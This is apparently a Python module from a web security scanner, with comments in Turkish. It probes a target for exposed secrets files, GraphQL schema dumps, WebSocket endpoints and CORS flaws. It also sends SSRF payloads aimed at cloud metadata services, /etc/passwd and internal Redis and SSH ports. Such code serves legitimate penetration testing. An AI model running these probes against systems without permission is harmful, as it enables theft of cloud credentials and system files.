import os
import re
import json
import subprocess
from core.engine import run_cmd

INFO_ENDPOINTS = [
    '/api/debug',        '/api/status',       '/api/env',
    '/api/config',       '/api/version',      '/api/info',
    '/api/health',       '/debug',            '/status',
    '/server-status',    '/server-info',      '/.env',
    '/config.json',      '/app.json',         '/package.json',
    '/composer.json',    '/webpack.config.js','/app/config',
    '/api/swagger',      '/swagger.json',     '/swagger-ui.html',
    '/api-docs',         '/openapi.json',     '/openapi.yaml',
    '/v1/swagger',       '/api/v1/swagger',   '/docs',
    '/api/docs',         '/.git/config',      '/.git/HEAD',
    '/backup',           '/backup.zip',       '/backup.sql',
    '/dump.sql',         '/db.sql',           '/database.sql',
    '/admin',            '/admin/login',      '/administrator',
    '/wp-admin',         '/wp-login.php',     '/phpmyadmin',
    '/adminer.php',      '/console',          '/shell',
    '/phpinfo.php',      '/info.php',         '/test.php',
]

GRAPHQL_ENDPOINTS = [
    '/graphql',
    '/api/graphql',
    '/v1/graphql',
    '/query',
    '/api/query',
]

SSRF_PAYLOADS = [
    'http://169.254.169.254/latest/meta-data/',
    'http://metadata.google.internal/computeMetadata/v1/',
    'http://127.0.0.1:22',
    'http://127.0.0.1:3306',
    'http://localhost/admin',
    'dict://127.0.0.1:6379/info',
    'file:///etc/passwd',
]


def check_info_endpoints(base_url: str) -> list[dict]:
    """Bilgi sızdıran endpoint'leri tara."""
    findings = []

    for path in INFO_ENDPOINTS:
        try:
            r = subprocess.run(
                ['curl', '-s', '-w', '\n%{http_code}\n%{size_download}',
                 '--connect-timeout', '5',
                 f"{base_url}{path}"],
                capture_output=True, text=True, timeout=10,
            )
            parts  = r.stdout.rsplit('\n', 2)
            body   = parts[0] if len(parts) > 0 else ''
            sc     = parts[1].strip() if len(parts) > 1 else '0'
            size   = parts[2].strip() if len(parts) > 2 else '0'

            if sc in ('200', '201') and int(size or 0) > 10:
                severity = 'HIGH'
                note     = ''

                # Özellikle tehlikeli olanlar
                if any(x in path for x in ['.env', '.git', 'config', 'swagger', 'phpinfo', 'backup', '.sql']):
                    severity = 'CRITICAL'
                    note = 'Sensitive file exposed'
                elif any(x in path for x in ['admin', 'phpmyadmin', 'adminer', 'console']):
                    severity = 'HIGH'
                    note = 'Admin panel exposed'
                elif 'swagger' in path or 'openapi' in path or 'api-docs' in path:
                    severity = 'MEDIUM'
                    note = 'API documentation exposed'

                # package.json içinde version/dependencies var mı?
                if 'package.json' in path and 'version' in body:
                    severity = 'MEDIUM'
                    note = 'Package info exposed'

                findings.append({
                    'url':      f"{base_url}{path}",
                    'status':   sc,
                    'size':     size,
                    'severity': severity,
                    'type':     'Information Disclosure',
                    'note':     note,
                    'snippet':  body[:200],
                })
        except Exception:
            pass

    return findings


def graphql_introspection(base_url: str) -> dict:
    """GraphQL introspection dene — tüm şemayı dump et."""
    results = {'endpoint': None, 'introspection': False, 'types': [], 'queries': [], 'mutations': []}

    introspection_query = json.dumps({
        'query': '{ __schema { types { name kind fields { name type { name kind } } } queryType { fields { name description args { name type { name kind } } } } mutationType { fields { name description } } } }'
    })

    for path in GRAPHQL_ENDPOINTS:
        try:
            r = subprocess.run(
                ['curl', '-s',
                 '-X', 'POST',
                 '-H', 'Content-Type: application/json',
                 '-d', introspection_query,
                 f"{base_url}{path}"],
                capture_output=True, text=True, timeout=15,
            )
            body = r.stdout
            if '"__schema"' in body or '"data"' in body:
                results['endpoint'] = path
                results['introspection'] = True

                try:
                    data = json.loads(body)
                    schema = data.get('data', {}).get('__schema', {})

                    # Type'ları çıkar
                    for t in schema.get('types', []):
                        name = t.get('name', '')
                        if not name.startswith('__'):
                            results['types'].append(name)

                    # Query'leri çıkar
                    qt = schema.get('queryType', {})
                    for f in qt.get('fields', []):
                        results['queries'].append(f.get('name', ''))

                    # Mutation'ları çıkar
                    mt = schema.get('mutationType', {})
                    if mt:
                        for f in mt.get('fields', []):
                            results['mutations'].append(f.get('name', ''))
                except Exception:
                    pass

                return results
        except Exception:
            pass

    return results


def ssrf_check(base_url: str, endpoints: list[str]) -> list[dict]:
    """SSRF — URL parametresi alan endpoint'lere iç ağ isteği attır."""
    findings  = []
    url_params = ['url', 'uri', 'path', 'dest', 'redirect', 'next',
                  'target', 'redir', 'img', 'image', 'src', 'source',
                  'callback', 'webhook', 'endpoint', 'fetch', 'load']

    # URL parametresi içeren endpoint'leri bul
    candidates = [ep for ep in endpoints if '?' in ep and
                  any(p in ep.lower() for p in url_params)]

    if not candidates:
        # Manuel deneme — yaygın endpoint'lere url parametresi ekle
        candidates = [
            f"{base_url}/api/fetch?url=",
            f"{base_url}/api/proxy?url=",
            f"{base_url}/api/image?url=",
        ]

    for endpoint in candidates[:5]:
        for ssrf_payload in SSRF_PAYLOADS[:3]:
            try:
                target_url = endpoint if endpoint.endswith('=') else f"{endpoint}?url="
                target_url = f"{target_url}{ssrf_payload}"

                r = subprocess.run(
                    ['curl', '-s', '-w', '\n%{http_code}',
                     '--connect-timeout', '5',
                     target_url],
                    capture_output=True, text=True, timeout=15,
                )
                parts = r.stdout.rsplit('\n', 1)
                body  = parts[0] if parts else ''
                sc    = parts[1].strip() if len(parts) > 1 else '0'

                # AWS metadata, Linux dosyaları veya iç servis cevabı
                if any(indicator in body for indicator in [
                    'ami-id', 'instance-id', 'computeMetadata',
                    'root:x:0:0', 'SSH-', '+OK', 'redis_version',
                ]):
                    findings.append({
                        'url':      target_url,
                        'payload':  ssrf_payload,
                        'severity': 'CRITICAL',
                        'type':     'SSRF',
                        'response': body[:300],
                    })
            except Exception:
                pass

    return findings


def websocket_check(base_url: str) -> dict:
    """WebSocket endpoint var mı, auth var mı?"""
    result   = {'found': False, 'endpoints': [], 'auth_required': None}
    ws_paths = ['/ws', '/websocket', '/socket', '/socket.io', '/api/ws', '/chat/ws']

    for path in ws_paths:
        try:
            # HTTP upgrade isteği gönder
            r = subprocess.run(
                ['curl', '-s', '-w', '\n%{http_code}',
                 '-H', 'Upgrade: websocket',
                 '-H', 'Connection: Upgrade',
                 '-H', 'Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==',
                 '-H', 'Sec-WebSocket-Version: 13',
                 f"{base_url}{path}"],
                capture_output=True, text=True, timeout=10,
            )
            parts = r.stdout.rsplit('\n', 1)
            sc    = parts[1].strip() if len(parts) > 1 else '0'

            if sc in ('101', '200', '400'):  # 101 = Switching Protocols
                result['found'] = True
                result['endpoints'].append({
                    'path':   path,
                    'status': sc,
                    'note':   'WebSocket endpoint found' if sc == '101' else 'Possible WS endpoint',
                })
                if sc == '101':
                    result['auth_required'] = False  # Direkt upgrade kabul etti
        except Exception:
            pass

    return result


def cors_advanced_check(base_url: str) -> list[dict]:
    """Gelişmiş CORS testi."""
    findings  = []
    origins   = [
        'https://evil.com',
        'https://attacker.com',
        f'https://evil.{base_url.replace("https://", "")}',
        'null',
        'https://localhost',
    ]

    for origin in origins:
        try:
            r = subprocess.run(
                ['curl', '-s', '-I',
                 '-H', f'Origin: {origin}',
                 base_url],
                capture_output=True, text=True, timeout=10,
            )
            headers = r.stdout

            acao = ''
            acac = ''
            for line in headers.splitlines():
                if 'access-control-allow-origin' in line.lower():
                    acao = line.split(':', 1)[-1].strip()
                if 'access-control-allow-credentials' in line.lower():
                    acac = line.split(':', 1)[-1].strip()

            if acao == '*' and acac == 'true':
                findings.append({
                    'url':      base_url,
                    'origin':   origin,
                    'acao':     acao,
                    'acac':     acac,
                    'severity': 'CRITICAL',
                    'type':     'CORS Misconfiguration',
                    'note':     'Wildcard + credentials — cookie theft possible',
                })
            elif acao == origin:
                findings.append({
                    'url':      base_url,
                    'origin':   origin,
                    'acao':     acao,
                    'acac':     acac,
                    'severity': 'HIGH' if acac == 'true' else 'MEDIUM',
                    'type':     'CORS Origin Reflected',
                    'note':     'Origin reflected in ACAO header',
                })
            elif acao == 'null':
                findings.append({
                    'url':      base_url,
                    'origin':   origin,
                    'acao':     acao,
                    'severity': 'HIGH',
                    'type':     'CORS null Origin',
                    'note':     'null origin allowed — sandbox bypass',
                })
        except Exception:
            pass

    return findings


def run_discovery(
    target: str,
    alive_hosts: list[str],
    endpoints: list[str],
    progress_cb=None,
) -> dict:
    results = {}

    def upd(name, status, pct):
        if progress_cb:
            progress_cb(name, status, pct)

    base_url = f"https://{target}"

    from concurrent.futures import ThreadPoolExecutor

    upd('info_endpoints', 'running', 0.0)
    upd('graphql',        'running', 0.0)
    upd('websocket',      'running', 0.0)
    upd('cors_advanced',  'running', 0.0)

    with ThreadPoolExecutor(max_workers=4) as ex:
        f1 = ex.submit(check_info_endpoints, base_url)
        f2 = ex.submit(graphql_introspection, base_url)
        f3 = ex.submit(websocket_check,       base_url)
        f4 = ex.submit(cors_advanced_check,   base_url)

        results['info_endpoints'] = f1.result(); upd('info_endpoints', 'done', 1.0)
        results['graphql']        = f2.result(); upd('graphql',        'done', 1.0)
        results['websocket']      = f3.result(); upd('websocket',      'done', 1.0)
        results['cors_advanced']  = f4.result(); upd('cors_advanced',  'done', 1.0)

    # SSRF — endpoint listesi hazırsa
    upd('ssrf', 'running', 0.0)
    results['ssrf'] = run_ssrf = ssrf_check(base_url, endpoints)
    upd('ssrf', 'done', 1.0)

    return results


def ssrf_check_wrapper(base_url, endpoints):
    return ssrf_check(base_url, endpoints)